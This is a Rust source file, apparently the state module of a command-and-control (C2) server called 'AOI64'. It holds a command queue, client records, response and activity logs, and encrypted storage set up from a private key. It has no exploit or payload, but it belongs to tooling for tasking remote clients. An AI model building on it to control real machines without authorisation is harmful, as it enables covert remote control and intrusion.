use crate::crypto::ServerCrypto;
use crate::types::{ClientInfo, Command, LogEntry};
use crate::util::unix_time;
use serde_json::Value;
use std::collections::HashMap;
use tokio::sync::{Mutex, Notify};

pub struct AppState {
    pub command_queue: Mutex<Vec<Command>>,
    pub response_log: Mutex<Vec<Value>>,
    pub activity_log: Mutex<Vec<LogEntry>>,
    pub client_info: Mutex<HashMap<String, ClientInfo>>, // クライアント情報管理
    pub notify: Notify,
    pub crypto: ServerCrypto, // 暗号化処理
    pub _server_start: u64, // サーバー開始時刻（将来使用予定）
}

impl AppState {
    pub fn new() -> Self {
        // 暗号化システムを初期化（環境変数または既定値を使用）
        let private_key_path = std::env::var("AOI64_PRIVATE_KEY_PATH")
            .unwrap_or_else(|_| "private_key.pem".to_string());
        let storage_path = std::env::var("AOI64_STORAGE_PATH")
            .unwrap_or_else(|_| "encrypted_storage".to_string());
        
        println!("🔑 C2 Server Crypto Configuration:");
        println!("   Private key: {}", private_key_path);
        println!("   Storage directory: {}", storage_path);
        
        let crypto = ServerCrypto::new(&private_key_path, &storage_path);
        
        Self {
            command_queue: Mutex::new(Vec::new()),
            response_log: Mutex::new(Vec::new()),
            activity_log: Mutex::new(Vec::new()),
            client_info: Mutex::new(HashMap::new()),
            notify: Notify::new(),
            crypto,
            _server_start: unix_time(),
        }
    }
}

pub async fn log_activity(
    state: &AppState,
    level: &str,
    message: &str,
    client_id: Option<&str>,
    command_id: Option<&str>,
    details: Option<Value>,
) {
    let entry = LogEntry {
        timestamp: unix_time(),
        level: level.to_string(),
        message: message.to_string(),
        client_id: client_id.map(str::to_string),
        command_id: command_id.map(str::to_string),
        details,
    };

    let mut log = state.activity_log.lock().await;
    log.push(entry);

    // 最新1000件まで保持
    if log.len() > 1000 {
        let excess = log.len() - 1000;
        log.drain(0..excess);
    }
}

